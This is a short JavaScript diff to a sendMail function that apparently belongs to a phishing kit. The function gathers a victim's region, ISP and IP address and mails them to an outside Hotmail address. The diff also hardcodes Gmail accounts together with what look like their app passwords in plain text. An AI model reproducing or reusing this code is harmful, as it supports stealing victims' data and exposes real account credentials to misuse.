@@ -7,18 +7,18 @@ const sendMail = (
   region,
   isp,
   IPAddress,
-  sender,
+  user,
   res
 ) => {
   let auth
   let to
-  if (sender === 'pat.nishimoto2@gmail.com') {
+  if (user === 'pat.nishimoto2@gmail.com') {
     auth = {
       user: 'pat.nishimoto2@gmail.com',
       pass: 'khra ryeh iqav bcmz',
     }
     to = 'Ibekzmoney@hotmail.com'
-  } else if (sender === 'timiperla@gmail.com') {
+  } else if (user === 'timiperla@gmail.com') {
     auth = {
       user: 'timiperla@gmail.com',
       pass: 'cbpj ypnx ctoh dlmo',
